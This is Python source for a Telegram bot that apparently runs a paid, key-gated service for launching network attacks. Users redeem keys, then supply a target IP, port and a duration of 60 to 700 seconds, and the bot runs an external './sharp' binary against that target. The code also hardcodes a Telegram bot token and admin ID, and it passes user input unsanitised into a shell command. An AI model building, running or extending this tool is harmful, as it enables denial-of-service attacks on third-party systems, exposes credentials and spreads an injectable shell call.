import asyncio
import random
import string
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackContext, CallbackQueryHandler, MessageHandler, filters

# Global variables to manage attack states and tasks for each user
user_attack_data = {}  # Stores data of current attacks for each user (IP, port, duration)
valid_keys = set()  # Store valid keys here
users = {}  # Dictionary to store user IDs and their redeemed keys
keys = {}  # Store generated keys with expiration dates
attack_in_progress = {}  # Track active attacks
attack_status = {}  # Track attack status (running, paused)

# Function to add time to the current date
def add_time_to_current_date(hours=0, days=0):
    return datetime.now() + timedelta(hours=hours, days=days)

# Function to generate a unique key
def generate_key(length=10):
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))

# Main menu keyboard (used after start and showing relevant options)
def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("🔑 Generate Key", callback_data="genkey")],
        [InlineKeyboardButton("🗝️ Redeem Key", callback_data="redeem_key")],
        [InlineKeyboardButton("✅ Already Approved", callback_data="already_approved")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Automatic mode keyboard (shown after redeeming the key)
def automatic_mode_keyboard():
    keyboard = [
        [InlineKeyboardButton("⚙️ Automatic Mode", callback_data="automatic_mode")],
        [InlineKeyboardButton("ℹ️ Help", callback_data="help")]  # Help button added here
    ]
    return InlineKeyboardMarkup(keyboard)

# Help information message
async def show_help(update: Update, context: CallbackContext):
    help_text = (
        "🆘 *Help Section*\n\n"
        "This bot helps you to generate keys and perform attacks using the Automatic Mode.\n\n"
        "*Commands and Features:*\n"
        "1. **Generate Key**: Admins can generate keys that can be redeemed by users.\n"
        "2. **Redeem Key**: Users can redeem a valid key to gain access to bot features.\n"
        "3. **Already Approved**: Check if you have already redeemed a key.\n"
        "4. **Automatic Mode**: Start an attack by providing an IP address, port number, and duration.\n"
        "\n"
        "To redeem a key, use the format: `/redeem <key>`.\n"
        "\n"
        "If you have any questions, please contact the admin."
    )
    await update.callback_query.answer()
    await context.bot.send_message(update.callback_query.from_user.id, text=help_text, parse_mode='Markdown')

# Attack timing selection keyboard
def attack_timing_keyboard():
    keyboard = [
        [InlineKeyboardButton("⏱️ 60 sec", callback_data="duration_60")],
        [InlineKeyboardButton("⏱️ 120 sec", callback_data="duration_120")],
        [InlineKeyboardButton("⏱️ 240 sec", callback_data="duration_240")],
        [InlineKeyboardButton("⏱️ 500 sec", callback_data="duration_500")],
        [InlineKeyboardButton("⏱️ 700 sec", callback_data="duration_700")]
    ]
    return InlineKeyboardMarkup(keyboard)

# Show automatic mode after the attack
async def show_automatic_mode(chat_id, context: CallbackContext):
    await context.bot.send_message(chat_id=chat_id, text="The attack is completed. You can now start a new attack using the Automatic Mode.", reply_markup=automatic_mode_keyboard())

# Start command - welcome message and show main buttons
async def start(update: Update, context: CallbackContext) -> None:
    user_id = str(update.message.from_user.id)
    username = update.message.from_user.username
    await update.message.reply_text(f"👋 Welcome {username}!\nThis Tool is provided by @Bluryf4ce. Select an option:", reply_markup=main_menu_keyboard())

# Function to handle attacks
async def handle_attack(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    chat_id = query.message.chat.id
    user_id = str(query.from_user.id)

    # Handle automatic mode flow
    if query.data == "automatic_mode":
        # Step 1: Ask for the IP address
        user_attack_data[user_id] = {"step": 1}  # Reset attack data and set step to 1
        await context.bot.send_message(chat_id=chat_id, text="💻 Please provide your target IP address:")
        return

    # Handle duration selection after all inputs are collected (timing selection)
    if query.data.startswith("duration_"):
        duration = int(query.data.split("_")[1])
        user_attack_data[user_id]["duration"] = duration

        await context.bot.send_message(chat_id=chat_id, text=f"🔒 Starting attack for {duration} seconds on IP {user_attack_data[user_id]['ip']} Port {user_attack_data[user_id]['port']}.")
        
        # Start the attack
        await run_attack(chat_id, user_attack_data[user_id]['ip'], user_attack_data[user_id]['port'], duration, context)

# Run the attack using an external command
async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress
    if chat_id in attack_in_progress and attack_in_progress[chat_id]:
        await context.bot.send_message(chat_id=chat_id, text="⚠️ Another attack is already in progress. Please wait.")
        return

    attack_in_progress[chat_id] = True
    attack_status[chat_id] = "running"  # Set attack status to running

    # Send message indicating that the attack has started
    await context.bot.send_message(chat_id=chat_id, text="🔒 Attack started!")

    try:
        # Execute the external command here
        process = await asyncio.create_subprocess_shell(
            f"./sharp {ip} {port} {duration}",
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )

        # Simulating attack execution
        for _ in range(duration // 5):  # Simulate in 5-second intervals
            await asyncio.sleep(5)  # Simulate 5 seconds of attack time

        stdout, stderr = await process.communicate()

        # Check and send output to Telegram
        if stdout:
            await context.bot.send_message(chat_id=chat_id, text=f"🔊 Output:\n{stdout.decode()}")
        if stderr:
            await context.bot.send_message(chat_id=chat_id, text=f"❌ Error:\n{stderr.decode()}")

        await context.bot.send_message(chat_id=chat_id, text="✅ *Attack Successfully Completed!* 🎉")
        
        # Show action buttons again after attack is completed
        await show_automatic_mode(chat_id, context)  # Pass context here

    except Exception as e:
        await context.bot.send_message(chat_id=chat_id, text=f"⚠️ Error during the attack: {str(e)}")

    finally:
        attack_in_progress[chat_id] = False
        attack_status[chat_id] = "stopped"  # Reset attack status

# Function to handle IP and Port inputs from user in Automatic Mode
async def handle_user_input(update: Update, context: CallbackContext):
    user_id = str(update.message.from_user.id)
    chat_id = update.message.chat.id
    message_text = update.message.text

    # Step 1: User provides IP address
    if user_id in user_attack_data and user_attack_data[user_id]["step"] == 1:
        user_attack_data[user_id]["ip"] = message_text
        user_attack_data[user_id]["step"] = 2  # Move to step 2 (port)
        await context.bot.send_message(chat_id=chat_id, text="⚙️ Now, please provide the target port number:")
        return

    # Step 2: User provides Port number
    if user_id in user_attack_data and user_attack_data[user_id]["step"] == 2:
        user_attack_data[user_id]["port"] = message_text
        user_attack_data[user_id]["step"] = 3  # Move to step 3 (timing)
        await context.bot.send_message(chat_id=chat_id, text="⏳ Select the attack duration:", reply_markup=attack_timing_keyboard())
        return

# Handle redeeming key functionality
async def handle_redeem_key(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()
    await context.bot.send_message(query.from_user.id, "Please send your key in the format: `/redeem <key>`.")

# Redeem key functionality
async def redeem(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = str(update.effective_user.id)
    args = context.args

    if not args or len(args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Invalid command format.* Use `/redeem <key>`.", parse_mode='Markdown')
        return

    key = args[0]

    if key in keys:
        if user_id not in users:
            users[user_id] = key
            del keys[key]  # Remove the key from valid keys

            await context.bot.send_message(chat_id=chat_id, text="✅ *Key successfully redeemed!* You now have access to the bot's features.", parse_mode='Markdown')

            # After redeeming, show the Automatic Mode and Help buttons only
            await context.bot.send_message(chat_id=chat_id, text="Select an option:", reply_markup=automatic_mode_keyboard())
        else:
            await context.bot.send_message(chat_id=chat_id, text="You have already redeemed a key.")
    else:
        await context.bot.send_message(chat_id=chat_id, text="❌ *Invalid or already redeemed key.*", parse_mode='Markdown')

# Already Approved button functionality
async def handle_already_approved(update: Update, context: CallbackContext):
    query = update.callback_query
    user_id = str(query.from_user.id)

    if user_id in users:  # Check if user has already redeemed a key
        await context.bot.send_message(user_id, text="✅ You are already approved!")
        await context.bot.send_message(user_id, text="Select an option:", reply_markup=automatic_mode_keyboard())
    else:
        await context.bot.send_message(user_id, text="❌ You have not redeemed a key yet. Please redeem a key to proceed.")

# Generate key command for admins
async def genkey(update: Update, context: CallbackContext):
    user_id = str(update.callback_query.from_user.id)  # Now using callback data instead of command
    if user_id in ADMIN_IDS:
        key = generate_key()
        expiration_date = add_time_to_current_date(days=30)
        keys[key] = expiration_date

        await context.bot.send_message(user_id, text=f"Key generated: {key}\nExpires on: {expiration_date}")
    else:
        await context.bot.send_message(user_id, text="ONLY OWNER CAN USE💀OWNER @Bluryf4ce")

# Main function
def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Command Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("redeem", redeem))  # Redeem key command

    # Callback Query Handlers
    application.add_handler(CallbackQueryHandler(handle_attack, pattern="^(automatic_mode|duration_60|duration_120|duration_240|duration_500|duration_700)$"))  # Handle attack-related actions
    application.add_handler(CallbackQueryHandler(handle_redeem_key, pattern="^redeem_key$"))  # Handle Redeem Key button click
    application.add_handler(CallbackQueryHandler(genkey, pattern="^genkey$"))  # Handle GenKey button click
    application.add_handler(CallbackQueryHandler(handle_already_approved, pattern="^already_approved$"))  # Handle Already Approved button click
    application.add_handler(CallbackQueryHandler(show_help, pattern="^help$"))  # Handle Help button click

    # Message Handler to handle user input for IP and Port in Automatic Mode
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_user_input))

    application.run_polling()

# Bot token and user/channel details
BOT_TOKEN = '7296382705:AAFSE1pURVyx4M0Qr9nlssGGPZm6HKG-pF0'
ADMIN_IDS = ['6965153309']  # Admin user IDs

if __name__ == '__main__':
    main()
